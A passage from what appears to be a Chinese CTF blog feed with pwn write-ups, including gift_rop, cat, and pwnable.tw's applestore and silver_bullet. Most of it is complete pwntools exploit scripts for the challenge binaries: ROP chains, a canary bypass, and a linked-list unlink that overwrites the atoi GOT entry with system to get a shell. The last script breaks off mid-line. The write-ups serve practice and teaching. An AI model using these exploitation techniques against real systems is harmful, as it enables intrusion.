<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/chal&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        </span><br><span class="line">        p.recvuntil(<span class="string">b&quot;your gift: &quot;</span>)</span><br><span class="line">        flag += p.recv(<span class="number">1</span>).decode()</span><br><span class="line">        pd = <span class="string">b&#x27;\x90&#x27;</span> * <span class="number">17</span> + <span class="string">b&#x27;\x63&#x27;</span></span><br><span class="line">        p.sendafter(<span class="string">b&quot;result?&quot;</span>,pd)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h3 id="gift-rop"><a href="#gift-rop" class="headerlink" title="gift_rop"></a>gift_rop</h3><p>gadget都留着，直接ret2syscall就可以get shell，因为关闭了标准输出和标准错误，重定向就可以看到输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/gift_rop&#x27;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/gift_rop&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x00000000004c50f0</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401f2f</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000409f9e</span></span><br><span class="line">syscall = <span class="number">0x401CE4</span></span><br><span class="line">pop_rdx_rbx =<span class="number">0x000000000047f20b</span></span><br><span class="line">ret = <span class="number">0x000000000043d1d0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000040239e : xor eax, eax ; ret</span></span><br><span class="line"><span class="string">0x00000000004019d6 : add eax, 1 ; ret</span></span><br><span class="line"><span class="string">0x0000000000471268 : add eax, 2 ; ret</span></span><br><span class="line"><span class="string">0x0000000000471281 : add eax, 3 ; ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">xor_eax = <span class="number">0x000000000040239e</span></span><br><span class="line">add_eax_3= <span class="number">0x0000000000471281</span></span><br><span class="line">add_eax_2= <span class="number">0x0000000000471268</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment">#execve 59   eax = 59  rdi = &quot;/bin/sh\x00&quot;  rsi = 0  rdx = 0</span></span><br><span class="line">    pd = <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">    pd += p64(pop_rdi) + p64(binsh)</span><br><span class="line">    pd += p64(pop_rdx_rbx) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    pd += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">    pd += p64(xor_eax)</span><br><span class="line">    pd += p64(add_eax_3) * <span class="number">19</span></span><br><span class="line">    pd += p64(add_eax_2)</span><br><span class="line"></span><br><span class="line">    pd += p64(syscall)</span><br><span class="line"></span><br><span class="line">    p.sendafter(<span class="string">b&quot;checkin problem.&quot;</span>,pd)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;exec 1&gt;&amp;0&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><p>strcat会在字符串后面继续添加字符串，strcpy在复制字符串后会自动加’\0’,利用这两个特性，在vul函数中先将canary的最低位字节\x00覆盖掉，然后strcat就可以绕过canary修改返回地址，最后strcpy会将canary最后一字节恢复为\x00,程序结束返回system</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/chal&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x4011FE</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span> * <span class="number">2</span> + p64(system)</span><br><span class="line">    p.sendafter(<span class="string">b&quot;read:&quot;</span>,pd)</span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span></span><br><span class="line">    p.sendafter(<span class="string">b&quot;read:&quot;</span>,pd)</span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x39</span></span><br><span class="line">    p.sendafter(<span class="string">b&quot;read:&quot;</span>,pd)</span><br><span class="line"></span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>write up</category>
      </categories>
  </entry>
  <entry>
    <title>pwnable-applestore</title>
    <url>/2024/01/29/pwnable-applestore/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>这道题对于我这个菜鸟来说收获真的很大！！！</p>
<span id="more"></span>

<p>这道题的数据结构是双链表，结构体大小为0x10</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">applePhone</span>&#123;</span></span><br><span class="line">    <span class="type">char</span>* str;</span><br><span class="line">    <span class="type">int</span> price;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">applePhone</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">applePhone</span> *<span class="title">pre</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞点：当链表内的物品价格为7174时，购物车中会加入一个1￥的iPhone8，该结构体是存储在栈中的，起始地址是ebp-0x20</p>
<p><img src="/imgs/$%7Bfiilename%7D/pwnable-applestore-1-17065311708551.png" alt="pwnable-applestore-1"></p>
<p>漏洞利用：add、delete、cart、checkout都是handler中的函数，这也就意味着在调用这些函数时，他们的ebp的地址都是一样的，而且都存储着handker的ebp地址，然后buf的起始地址为ebp-0x22，也就是说，输入2个字节后，就到了iPhone8的结构体，也就是说我们能利用这个cart函数覆盖iPhone 8的结构体，结合函数中的printf就可以泄露地址</p>
<p><img src="/imgs/$%7Bfiilename%7D/pwnable-applestore-2.png" alt="pwnable-applestore-2"></p>
<p>那么就可以利用这个点，泄露libc基址和stack的地址，知识点：environ中存放着stack的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">	add(<span class="number">2</span>)</span><br><span class="line">checkout()</span><br><span class="line"></span><br><span class="line">pd = <span class="string">b&#x27;y\x00&#x27;</span> + p32(atoi_got) + p32(<span class="number">0</span>) * <span class="number">2</span> <span class="comment">#read不会被\x00截断</span></span><br><span class="line">cart(pd)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;27: &quot;</span>)</span><br><span class="line">atoi_got_true = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = atoi_got_true - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">environ_libc = libc_base + libc.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pd = <span class="string">b&#x27;y\x00&#x27;</span> + p32(environ_libc) + p32(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">cart(pd)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;27: &quot;</span>)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack:&quot;</span>,<span class="built_in">hex</span>(stack))</span><br></pre></td></tr></table></figure>

<p>然后再来看delete函数，实际上就是一个双链表删除的操作，v4是next指针，v5是pre指针，函数循环到要删除的结构体，假设删除iPhone8，那么就会执行</p>
<p>iPhone8-&gt;pre-&gt;next &#x3D; iPhone-&gt;next </p>
<p>iPhone8-&gt;next-&gt;pre &#x3D; iphon8-&gt;pre</p>
<p>那么利用这个点，如果我们将iPhone8-&gt;next覆盖为atoi_got + 0x22，iPhone8-&gt;pre覆盖为stack - 0x104 - 0x8，那么，也就等同于我们把地址为stack - 0x104的值覆盖为atoi_got + 0x22，</p>
<p>那么问题来了，stack - 0x104 - 0x8，stack - 0x104和atoi_got + 0x22有什么联系，为什么要覆盖成这几个值？</p>
<p>stack - 0x104 - 0x8 中的 -0x8 实际上是和下图中的*(_DWORD *)(v5 + 8)相对应，v5实际上就是stack - 0x104 - 0x8，减去0x8和 v5 + 8 相抵消了，即*(stack - 0x104) &#x3D; v4 &#x3D; atoi_got + 0x22</p>
<p>那么现在还有一个问题，为什么是atoi_got + 0x22，stack - 0x104实际上就是delete函数的ebp地址，delete函数的ebp中存储着handler函数中ebp地址，如果我们将其值覆盖为atoi_got + 0x22后，函数退出后就会将会使handler函数的ebp地址变为atoi_got + 0x22，而handler函数中的my_read(nptr, 0x15u)的nptr的起始地址就是ebp-0x22，即我们在输入的时候，输入的起始地址就是atoi_got的地址，从而我们就可以修改atoi的got表为system，紧接着在atoi执行的时候就相当于在执行system函数，并且参数就是我们输入的数据，所以我们在delete函数返回handler函数后，输入p32(system) + b’||&#x2F;bin&#x2F;sh’就可以将atoi的got表改为system，并在atoi执行的时候触发截断执行&#x2F;bin&#x2F;sh</p>
<p><img src="/imgs/$%7Bfiilename%7D/pwnable-applestore-3.png" alt="pwnable-applestore-3"></p>
<p>然后我来讲讲delete的ebp是如何得到的，这里我踩了个坑，可能是因为我用的ld.so文件是64位的，结果导致在测偏移的时候和实际偏移偏了0x20，导致我花了好几天才搞懂这个点</p>
<p>那在测偏移的时候肯定要先避免这个坑，先把附件的libc和ld.so给配好</p>
<p>用patchelf更改文件的libc和ld</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter [ld.so路径] --set-rpath [libc所在目录] [elf文件]</span><br></pre></td></tr></table></figure>

<p>比如我是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ~/glibc-all-in-one/libs/2.23-0ubuntu3_i386/ld-2.23.so --set-rpath ~/glibc-all-in-one/libs/2.23-0ubuntu3_i386/ ./applestore</span><br></pre></td></tr></table></figure>

<p>然后开始调试，在delete函数中下断点，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/applestore&#x27;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10104</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/applestore&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">num</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&quot;Device Number&gt; &quot;</span>, <span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">temp</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&quot;Item Number&gt; &quot;</span>, temp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cart</span>(<span class="params">temp</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&quot;Let me check your cart. ok? (y/n) &gt; &quot;</span>, temp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkout</span>():</span><br><span class="line">	p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&quot;Let me check your cart. ok? (y/n) &gt; &quot;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got.atoi</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        add(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        add(<span class="number">2</span>)</span><br><span class="line">    checkout()</span><br><span class="line"></span><br><span class="line">    pd = <span class="string">b&#x27;y\x00&#x27;</span> + p32(atoi_got) + p32(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">    cart(pd)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;27: &quot;</span>)</span><br><span class="line">    atoi_got_true = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    libc_base = atoi_got_true - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    environ_libc = libc_base + libc.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    pd = <span class="string">b&#x27;y\x00&#x27;</span> + p32(environ_libc) + p32(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">    cart(pd)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;27: &quot;</span>)</span><br><span class="line">    stack = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;stack:&quot;</span>,<span class="built_in">hex</span>(stack))</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">    p.interactive() </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>根据打印的信息，此时stack的值为0xff86806c</p>
<p><img src="/imgs/$%7Bfiilename%7D/pwnable-applestore-4.png" alt="pwnable-applestore-4"></p>
<p>然后查看一下栈，此时的ebp指向了0xff867f68，也就是说我们要改的是0xff867f68这个地址的值</p>
<p><img src="/imgs/$%7Bfiilename%7D/pwnable-applestore-5.png" alt="pwnable-applestore-5"></p>
<p>那么stack地址为0xff86806c，要改的地址为0xff867f68，那么他们的偏移就是0xff86806c - 0xff867f68 &#x3D; 0x104</p>
<p>到这里基本就没什么问题了</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10104</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/applestore&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">num</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&quot;Device Number&gt; &quot;</span>, <span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">temp</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&quot;Item Number&gt; &quot;</span>, temp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cart</span>(<span class="params">temp</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&quot;Let me check your cart. ok? (y/n) &gt; &quot;</span>, temp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkout</span>():</span><br><span class="line">	p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&quot;Let me check your cart. ok? (y/n) &gt; &quot;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got.atoi</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        add(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        add(<span class="number">2</span>)</span><br><span class="line">    checkout()</span><br><span class="line"></span><br><span class="line">    pd = <span class="string">b&#x27;y\x00&#x27;</span> + p32(atoi_got) + p32(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">    cart(pd)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;27: &quot;</span>)</span><br><span class="line">    atoi_got_true = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    libc_base = atoi_got_true - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    environ_libc = libc_base + libc.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    pd = <span class="string">b&#x27;y\x00&#x27;</span> + p32(environ_libc) + p32(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">    cart(pd)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;27: &quot;</span>)</span><br><span class="line">    stack = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;stack:&quot;</span>,<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">    pd = <span class="string">b&#x27;27&#x27;</span> + p32(<span class="number">0</span>) + p32(<span class="number">0x12345678</span>)</span><br><span class="line">    pd += p32(atoi_got + <span class="number">0x22</span>) + p32(stack - <span class="number">0x104</span> - <span class="number">0x8</span>) </span><br><span class="line">    delete(pd)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, p32(system) + <span class="string">b&quot;||/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
      <tags>
        <tag>environ</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable-silver_bullet</title>
    <url>/2024/01/27/pwnable-silver-bullet/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>读入的字符串s在ebp-0x34的位置，储存长度的地址为ebp-0x4</p>
<span id="more"></span>

<p><img src="/imgs/$%7Bfiilename%7D/pwnable-silver_bullet-1.png" alt="pwnable-silver_bullet-1"></p>
<p><img src="/imgs/$%7Bfiilename%7D/pwnable-silver_bullet-2.png" alt="pwnable-silver_bullet-2"></p>
<p>利用strncat会在字符串尾加\x00，这个字节造成溢出，可以利用这个点覆盖字符串长度</p>
<p>思路：先create一个0x2f长度的字符串，再power一个字节，那么储存的长度0x2f会因为strncat覆盖成\x00，之后power函数中还会对power输入的字节进行重新统计，那么最终储存的长度就会变成0 + 1 &#x3D; 1，所以我们又可以在已经输入的字符串后面添加0x30-1个字符，这就造成了溢出，利用这个溢出，我们就可以修改字符串的长度，并写上rop，然后就可以打败Gin，执行我们的rop</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10103</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/silver_bullet&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc_32.so.6&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">data</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span 